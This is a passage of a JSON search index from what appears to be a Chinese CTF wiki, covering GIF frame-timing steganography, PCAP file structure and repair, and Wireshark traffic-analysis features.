            "location": "/misc/picture/gif/#_4", 
            "text": "GIF\u6587\u4ef6\u6bcf\u4e00\u5e27\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4fe1\u606f\u9690\u85cf\u7684\u8f7d\u4f53\u3002  \u4f8b\u5982\u5728\u5f53\u65f6\u5728XMan\u9009\u62d4\u8d5b\u51fa\u7684\u4e00\u9898   XMAN-2017:100.gif   \u901a\u8fc7 identify \u547d\u4ee4\u6e05\u6670\u7684\u6253\u5370\u51fa\u6bcf\u4e00\u5e27\u7684\u65f6\u95f4\u95f4\u9694  $ identify -format  %s %T \\n   100 .gif 0   66  1   66  2   20  3   10  4   20  5   10  6   10  7   20  8   20  9   20  10   20  11   10  12   20  13   20  14   10  15   10   \u63a8\u65ad  20   10   \u5206\u522b\u4ee3\u8868  0   1 \uff0c\u63d0\u53d6\u6bcf\u4e00\u5e27\u95f4\u9694\u5e76\u8fdb\u884c\u8f6c\u5316\u3002  $ cat flag | cut -d     -f  2 | tr -d  66 | tr -d  \\n | tr -d  0 | tr  2   0  0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101 #   \u6700\u540e\u8f6c ASCII \u7801\u5f97\u5230 flag\u3002", 
            "title": "\u65f6\u95f4\u8f74"
        }, 
        {
            "location": "/misc/picture/gif/#_5", 
            "text": "F5-steganography", 
            "title": "\u9690\u5199\u8f6f\u4ef6"
        }, 
        {
            "location": "/misc/traffic/introduction/", 
            "text": "\u6d41\u91cf\u5305\u5206\u6790\n\n\nCTF \u6bd4\u8d5b\u4e2d,\u6d41\u91cf\u5305\u7684\u53d6\u8bc1\u5206\u6790\u662f\u53e6\u4e00\u9879\u91cd\u8981\u7684\u8003\u5bdf\u65b9\u5411\u3002\n\n\n\u901a\u5e38\u6bd4\u8d5b\u4e2d\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5305\u542b\u6d41\u91cf\u6570\u636e\u7684 PCAP \u6587\u4ef6\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u9700\u8981\u9009\u624b\u4eec\u5148\u8fdb\u884c\u4fee\u590d\u6216\u91cd\u6784\u4f20\u8f93\u6587\u4ef6\u540e\uff0c\u518d\u8fdb\u884c\u5206\u6790\u3002\n\n\nPCAP \u8fd9\u4e00\u5757\u4f5c\u4e3a\u91cd\u70b9\u8003\u5bdf\u65b9\u5411\uff0c\u590d\u6742\u7684\u5730\u65b9\u5728\u4e8e\u6570\u636e\u5305\u91cc\u5145\u6ee1\u7740\u5927\u91cf\u65e0\u5173\u7684\u6d41\u91cf\u4fe1\u606f\uff0c\u56e0\u6b64\u5982\u4f55\u5206\u7c7b\u548c\u8fc7\u6ee4\u6570\u636e\u662f\u53c2\u8d5b\u8005\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002\n\n\n\u603b\u7684\u6765\u8bf4\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\n\n\n\n\n\u603b\u4f53\u628a\u63e1\n\n\n\u534f\u8bae\u5206\u7ea7\n\n\n\u7aef\u70b9\u7edf\u8ba1\n\n\n\n\n\n\n\u8fc7\u6ee4\u8d5b\u9009\n\n\n\u8fc7\u6ee4\u8bed\u6cd5\n\n\nHost\uff0cProtocol\uff0ccontains\uff0c\u7279\u5f81\u503c\n\n\n\n\n\n\n\u53d1\u73b0\u5f02\u5e38\n\n\n\u7279\u6b8a\u5b57\u7b26\u4e32\n\n\n\u534f\u8bae\u67d0\u5b57\u6bb5\n\n\nflag \u4f4d\u4e8e\u670d\u52a1\u5668\u4e2d\n\n\n\n\n\n\n\u6570\u636e\u63d0\u53d6\n\n\n\u5b57\u7b26\u4e32\u53d6\n\n\n\u6587\u4ef6\u63d0\u53d6\n\n\n\n\n\n\n\n\n\u603b\u7684\u6765\u8bf4\u6bd4\u8d5b\u4e2d\u7684\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u6982\u62ec\u4e3a\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u5411:\n\n\n\n\n\u6d41\u91cf\u5305\u4fee\u590d\n\n\n\u534f\u8bae\u5206\u6790\n\n\n\u6570\u636e\u63d0\u53d6", 
            "title": "\u6d41\u91cf\u5305\u5206\u6790\u7b80\u4ecb"
        }, 
        {
            "location": "/misc/traffic/introduction/#_1", 
            "text": "CTF \u6bd4\u8d5b\u4e2d,\u6d41\u91cf\u5305\u7684\u53d6\u8bc1\u5206\u6790\u662f\u53e6\u4e00\u9879\u91cd\u8981\u7684\u8003\u5bdf\u65b9\u5411\u3002  \u901a\u5e38\u6bd4\u8d5b\u4e2d\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5305\u542b\u6d41\u91cf\u6570\u636e\u7684 PCAP \u6587\u4ef6\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u9700\u8981\u9009\u624b\u4eec\u5148\u8fdb\u884c\u4fee\u590d\u6216\u91cd\u6784\u4f20\u8f93\u6587\u4ef6\u540e\uff0c\u518d\u8fdb\u884c\u5206\u6790\u3002  PCAP \u8fd9\u4e00\u5757\u4f5c\u4e3a\u91cd\u70b9\u8003\u5bdf\u65b9\u5411\uff0c\u590d\u6742\u7684\u5730\u65b9\u5728\u4e8e\u6570\u636e\u5305\u91cc\u5145\u6ee1\u7740\u5927\u91cf\u65e0\u5173\u7684\u6d41\u91cf\u4fe1\u606f\uff0c\u56e0\u6b64\u5982\u4f55\u5206\u7c7b\u548c\u8fc7\u6ee4\u6570\u636e\u662f\u53c2\u8d5b\u8005\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002  \u603b\u7684\u6765\u8bf4\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4   \u603b\u4f53\u628a\u63e1  \u534f\u8bae\u5206\u7ea7  \u7aef\u70b9\u7edf\u8ba1    \u8fc7\u6ee4\u8d5b\u9009  \u8fc7\u6ee4\u8bed\u6cd5  Host\uff0cProtocol\uff0ccontains\uff0c\u7279\u5f81\u503c    \u53d1\u73b0\u5f02\u5e38  \u7279\u6b8a\u5b57\u7b26\u4e32  \u534f\u8bae\u67d0\u5b57\u6bb5  flag \u4f4d\u4e8e\u670d\u52a1\u5668\u4e2d    \u6570\u636e\u63d0\u53d6  \u5b57\u7b26\u4e32\u53d6  \u6587\u4ef6\u63d0\u53d6     \u603b\u7684\u6765\u8bf4\u6bd4\u8d5b\u4e2d\u7684\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u6982\u62ec\u4e3a\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u5411:   \u6d41\u91cf\u5305\u4fee\u590d  \u534f\u8bae\u5206\u6790  \u6570\u636e\u63d0\u53d6", 
            "title": "\u6d41\u91cf\u5305\u5206\u6790"
        }, 
        {
            "location": "/misc/traffic/fix/", 
            "text": "PCAP\u6587\u4ef6\u7ed3\u6784\n\n\n\u4e00\u822c\u6765\u8bf4,\u5bf9\u4e8e \nPCAP\n \u6587\u4ef6\u683c\u5f0f\u8003\u5bdf\u8f83\u5c11\uff0c\u4e14\u901a\u5e38\u90fd\u80fd\u501f\u52a9\u4e8e\u73b0\u6210\u7684\u5de5\u5177\u5982 \npcapfix\n \u76f4\u63a5\u4fee\u590d\uff0c\u8fd9\u91cc\u5927\u81f4\u4ecb\u7ecd\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u5757\uff0c\u8be6\u7ec6\u53ef\u4ee5\u7ffb\u770b\nHere\n\u3002\n\n\n\n\nTools\n\n\nPcapFix Online\n\n\nPcapFix\n\n\n\n\n\n\n\n\n\u4e00\u822c\u6587\u4ef6\u7ed3\u6784\n\n\n    \n0\n                   \n1\n                   \n2\n                   \n3\n   \n    \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                          Block Type                           \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                      Block Total Length                       \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                          Block Body                           /\n   /          /* variable length, aligned to \n32\n bits */            /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                      Block Total Length                       \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\n\u76ee\u524d\u6240\u5b9a\u4e49\u7684\u5e38\u89c1\u5757\u7c7b\u578b\u6709\n\n\n\n\nSection Header Block: it defines the most important characteristics of the capture file.\n\n\nInterface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic.\n\n\nPacket Block: it contains a single captured packet, or a portion of it.\n\n\nSimple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it.\n\n\nName Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart.\n\n\nCapture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to undestand the conditions in which the capture has been made.\n\n\n\n\n\u5e38\u89c1\u5757\n\n\nSection Header BlocK(\u6587\u4ef6\u5934)\n\n\n\u5fc5\u987b\u5b58\u5728,\u610f\u5473\u7740\u6587\u4ef6\u7684\u5f00\u59cb\n\n\n    \n0\n                   \n1\n                   \n2\n                   \n3\n   \n    \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                Byte-Order Magic \n(\n0x1A2B3C4D\n)\n                  \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n   Major Version\n(\n\u4e3b\u7248\u672c\u53f7\n)\n   \n|\n    Minor Version\n(\n\u6b21\u7248\u672c\u53f7\n)\n        \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                                                               \n|\n\n   \n|\n                          Section Length                       \n|\n\n   \n|\n                                                               \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                                                               /\n   /                      Options \n(\nvariable\n)\n                       /\n   /                                                               /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\nInterface Description Block(\u63a5\u53e3\u63cf\u8ff0)\n\n\n\u5fc5\u987b\u5b58\u5728,\u63cf\u8ff0\u63a5\u53e3\u7279\u6027\n\n\n    \n0\n                   \n1\n                   \n2\n                   \n3\n   \n    \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n           LinkType            \n|\n           Reserved            \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                  SnapLen\n(\n\u6bcf\u4e2a\u6570\u636e\u5305\u6700\u5927\u5b57\u8282\u6570\n)\n                  \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                                                               /\n   /                      Options \n(\nvariable\n)\n                       /\n   /                                                               /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\nPacket Block(\u6570\u636e\u5757)\n\n\n    \n0\n                   \n1\n                   \n2\n                   \n3\n   \n    \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n \n2\n \n3\n \n4\n \n5\n \n6\n \n7\n \n8\n \n9\n \n0\n \n1\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n         Interface ID          \n|\n          Drops Count          \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                     Timestamp \n(\nHigh\n)\n   \u6807\u51c6\u7684Unix\u683c\u5f0f          \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                        Timestamp \n(\nLow\n)\n                        \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                         Captured Len                          \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   \n|\n                          Packet Len                           \n|\n\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                          Packet Data                          /\n   /          /* variable length, aligned to \n32\n bits */            /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                      Options \n(\nvariable\n)\n                       /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://www.tcpdump.org/pcap/pcap.html\n\n\nhttps://zhuanlan.zhihu.com/p/27470338", 
            "title": "PCAP \u6587\u4ef6\u4fee\u590d"
        }, 
        {
            "location": "/misc/traffic/fix/#pcap", 
            "text": "\u4e00\u822c\u6765\u8bf4,\u5bf9\u4e8e  PCAP  \u6587\u4ef6\u683c\u5f0f\u8003\u5bdf\u8f83\u5c11\uff0c\u4e14\u901a\u5e38\u90fd\u80fd\u501f\u52a9\u4e8e\u73b0\u6210\u7684\u5de5\u5177\u5982  pcapfix  \u76f4\u63a5\u4fee\u590d\uff0c\u8fd9\u91cc\u5927\u81f4\u4ecb\u7ecd\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u5757\uff0c\u8be6\u7ec6\u53ef\u4ee5\u7ffb\u770b Here \u3002   Tools  PcapFix Online  PcapFix     \u4e00\u822c\u6587\u4ef6\u7ed3\u6784       0                     1                     2                     3    \n     0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1 \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                           Block Type                            | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                       Block Total Length                        | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                          Block Body                           /\n   /          /* variable length, aligned to  32  bits */            /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                       Block Total Length                        | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  \u76ee\u524d\u6240\u5b9a\u4e49\u7684\u5e38\u89c1\u5757\u7c7b\u578b\u6709   Section Header Block: it defines the most important characteristics of the capture file.  Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic.  Packet Block: it contains a single captured packet, or a portion of it.  Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it.  Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart.  Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to undestand the conditions in which the capture has been made.", 
            "title": "PCAP\u6587\u4ef6\u7ed3\u6784"
        }, 
        {
            "location": "/misc/traffic/fix/#_1", 
            "text": "", 
            "title": "\u5e38\u89c1\u5757"
        }, 
        {
            "location": "/misc/traffic/fix/#section-header-block", 
            "text": "\u5fc5\u987b\u5b58\u5728,\u610f\u5473\u7740\u6587\u4ef6\u7684\u5f00\u59cb       0                     1                     2                     3    \n     0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1 \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                 Byte-Order Magic  ( 0x1A2B3C4D )                    | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |    Major Version ( \u4e3b\u7248\u672c\u53f7 )     |     Minor Version ( \u6b21\u7248\u672c\u53f7 )          | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                                                                 | \n    |                           Section Length                        | \n    |                                                                 | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                                                               /\n   /                      Options  ( variable )                        /\n   /                                                               /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+", 
            "title": "Section Header BlocK(\u6587\u4ef6\u5934)"
        }, 
        {
            "location": "/misc/traffic/fix/#interface-description-block", 
            "text": "\u5fc5\u987b\u5b58\u5728,\u63cf\u8ff0\u63a5\u53e3\u7279\u6027       0                     1                     2                     3    \n     0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1 \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |            LinkType             |            Reserved             | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                   SnapLen ( \u6bcf\u4e2a\u6570\u636e\u5305\u6700\u5927\u5b57\u8282\u6570 )                    | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                                                               /\n   /                      Options  ( variable )                        /\n   /                                                               /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+", 
            "title": "Interface Description Block(\u63a5\u53e3\u63cf\u8ff0)"
        }, 
        {
            "location": "/misc/traffic/fix/#packet-block", 
            "text": "0                     1                     2                     3    \n     0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1   2   3   4   5   6   7   8   9   0   1 \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |          Interface ID           |           Drops Count           | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                      Timestamp  ( High )    \u6807\u51c6\u7684Unix\u683c\u5f0f           | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                         Timestamp  ( Low )                          | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                          Captured Len                           | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n    |                           Packet Len                            | \n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                          Packet Data                          /\n   /          /* variable length, aligned to  32  bits */            /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                      Options  ( variable )                        /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  \u53c2\u8003   http://www.tcpdump.org/pcap/pcap.html  https://zhuanlan.zhihu.com/p/27470338", 
            "title": "Packet Block(\u6570\u636e\u5757)"
        }, 
        {
            "location": "/misc/traffic/protocols/", 
            "text": "Wireshark \u5e38\u7528\u529f\u80fd\u4ecb\u7ecd\n\n\n\u663e\u793a\u8fc7\u6ee4\u5668\n\n\n\u663e\u793a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u7528\u5f88\u591a\u4e0d\u540c\u7684\u53c2\u6570\u6765\u4f5c\u4e3a\u5339\u914d\u6807\u51c6\uff0c\u6bd4\u5982IP\u5730\u5740\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u3001\u67d0\u4e9b\u534f\u8bae\u5934\u90e8\u7684\u53c2\u6570\u3002\u6b64\u5916\uff0c\u7528\u6237\u4e5f\u7528\u4e00\u4e9b\u6761\u4ef6\u5de5\u5177\u548c\u4e32\u8054\u8fd0\u7b97\u7b26\u521b\u5efa\u51fa\u66f4\u52a0\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u3002\u7528\u6237\u53ef\u4ee5\u5c06\u4e0d\u540c\u7684\u8868\u8fbe\u5f0f\u7ec4\u5408\u8d77\u6765\uff0c\u8ba9\u8f6f\u4ef6\u663e\u793a\u7684\u6570\u636e\u5305\u8303\u56f4\u66f4\u52a0\u7cbe\u786e\u3002\u5728\u6570\u636e\u5305\u5217\u8868\u9762\u677f\u4e2d\u663e\u793a\u7684\u6240\u6709\u6570\u636e\u5305\u90fd\u53ef\u4ee5\u7528\u6570\u636e\u5305\u4e2d\u5305\u542b\u7684\u5b57\u6bb5\u8fdb\u884c\u8fc7\u6ee4\u3002\n\n\n[not] Expression [and|or] [not] Expression\n\n\n\n\n\u7ecf\u5e38\u8981\u7528\u5230\u5404\u79cd\u8fd0\u7b97\u7b26\n\n\n\n\n\n\n\n\n\u8fd0\u7b97\u7b26\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\n==\n\n\n\u7b49\u4e8e\n\n\n\n\n\n\n!=\n\n\n\u4e0d\u7b49\u4e8e\n\n\n\n\n\n\n\n\n\u5927\u4e8e\n\n\n\n\n\n\n\n\n\u5c0f\u4e8e\n\n\n\n\n\n\n=\n\n\n\u5927\u4e8e\u7b49\u4e8e\n\n\n\n\n\n\n=\n\n\n\u5c0f\u4e8e\u7b49\u4e8e\n\n\n\n\n\n\n\u4e0e\n\n\nand , \n\n\n\n\n\n\n\u6216\n\n\nor , ||\n\n\n\n\n\n\n\u975e\n\n\n! , not\n\n\n\n\n\n\n\n\n\u914d\u7f6e\u65b9\u6cd5\n\n\n\n\n\n\n\u501f\u52a9\u4e8e\u8fc7\u6ee4\u5668\u7a97\u53e3\n\n\n\n\n\n\n\n\n\u501f\u52a9\u4e8e\u5de5\u5177\u6761\u7684\u8f93\u5165\u680f\n\n\n\n\n\n\n\n\n\u5c06\u6570\u636e\u5305\u67d0\u4e2a\u5c5e\u6027\u503c\u6307\u5b9a\u4e3a\u8fc7\u6ee4\u6761\u4ef6\n\n\n\n\n\n\n\n\n\n\nNote\n\n\n\u590d\u6742\u7684\u8fc7\u6ee4\u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7b2c\u4e09\u79cd\u65b9\u5f0f\u5f97\u5230\u8fc7\u6ee4\u8bed\u6cd5\n\n\n\n\n\u4fe1\u606f\u7edf\u8ba1\n\n\nProtocol History(\u534f\u8bae\u5206\u7ea7)\n\n\n\u8fd9\u4e2a\u7a97\u53e3\u73b0\u5b9e\u7684\u662f\u6355\u6349\u6587\u4ef6\u5305\u542b\u7684\u6240\u6709\u534f\u8bae\u7684\u6811\u72b6\u5206\u652f\n\n\n\n\n\u5305\u542b\u7684\u5b57\u6bb5\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u542b\u4e49\n\n\n\n\n\n\n\n\n\n\nProtocol\uff1a\n\n\n\u534f\u8bae\u540d\u79f0\n\n\n\n\n\n\n% Packets\uff1a\n\n\n\u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u6570\u76ee\u5728\u6355\u6349\u6587\u4ef6\u6240\u6709\u5305\u6240\u5360\u7684\u6bd4\u4f8b\n\n\n\n\n\n\nPackets\uff1a\n\n\n\u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u7684\u6570\u76ee\n\n\n\n\n\n\nBytes\uff1a\n\n\n\u542b\u6709\u8be5\u534f\u8bae\u7684\u5b57\u8282\u6570\n\n\n\n\n\n\nMbit/s\uff1a\n\n\n\u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd\n\n\n\n\n\n\nEnd Packets\uff1a\n\n\n\u8be5\u534f\u8bae\u4e2d\u7684\u5305\u7684\u6570\u76ee\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09\n\n\n\n\n\n\nEnd Bytes\uff1a\n\n\n\u8be5\u534f\u8bae\u4e2d\u7684\u5b57\u8282\u6570\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09\n\n\n\n\n\n\nEnd Mbit/s\uff1a\n\n\n\u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09\n\n\n\n\n\n\n\n\n\u8fd9\u4e00\u529f\u80fd\u53ef\u4ee5\u4e3a\u5206\u6790\u6570\u636e\u5305\u7684\u4e3b\u8981\u65b9\u5411\u63d0\u4f9b\u4f9d\u636e\n\n\nConversation(\u5bf9\u8bdd)\n\n\n\u53d1\u751f\u4e8e\u4e00\u7279\u5b9a\u7aef\u70b9\u7684IP\u95f4\u7684\u6240\u6709\u6d41\u91cf.\n\n\n\n\n\n\nNote\n\n\n\n\n\u67e5\u770b\u6536\u53d1\u5927\u91cf\u6570\u636e\u6d41\u7684IP\u5730\u5740\u3002\u5982\u679c\u662f\u4f60\u77e5\u9053\u7684\u670d\u52a1\u5668\uff08\u4f60\u8bb0\u5f97\u670d\u52a1\u5668\u7684\u5730\u5740\u6216\u5730\u5740\u8303\u56f4\uff09\uff0c\u90a3\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff1b\u4f46\u4e5f\u6709\u53ef\u80fd\u53ea\u662f\u67d0\u53f0\u8bbe\u5907\u6b63\u5728\u626b\u63cf\u7f51\u7edc\uff0c\u6216\u4ec5\u662f\u4e00\u53f0\u4ea7\u751f\u8fc7\u591a\u6570\u636e\u7684PC\u3002\n\n\n\u67e5\u770b\u626b\u63cf\u6a21\u5f0f\uff08scan pattern\uff09\u3002\u8fd9\u53ef\u80fd\u662f\u4e00\u6b21\u6b63\u5e38\u7684\u626b\u63cf\uff0c\u5982SNMP\u8f6f\u4ef6\u53d1\u9001ping\u62a5\u6587\u4ee5\u67e5\u627e\u7f51\u7edc\uff0c\u4f46\u901a\u5e38\u626b\u63cf\u90fd\u4e0d\u662f\u597d\u4e8b\u60c5\n\n\n\n\n\n\nEndPoints(\u7aef\u70b9)\n\n\n\u8fd9\u4e00\u5de5\u5177\u5217\u51fa\u4e86Wireshark\u53d1\u73b0\u7684\u6240\u6709endpoints\u4e0a\u7684\u7edf\u8ba1\u4fe1\u606f\n\n\n\n\nHTTP\n\n\n\n\n\n\nPacket Counter\n\n\n\n\n\n\n\n\n\u53c2\u8003\n\n\n\n\nhttp://blog.jobbole.com/73482/\n\n\nhttp://www.vuln.cn/2103\n\n\n\n\n\u4fe1\u606f\u7edf\u8ba1 \u8fdb\u9636\u7248\n\n\n\u6839\u636e\u603b\u4f53\u4fe1\u606f\u8fc5\u901f\u628a\u63e1\u6d41\u91cf\u5305\u603b\u4f53\u7279\u5f81,\u641e\u6e05\u695a 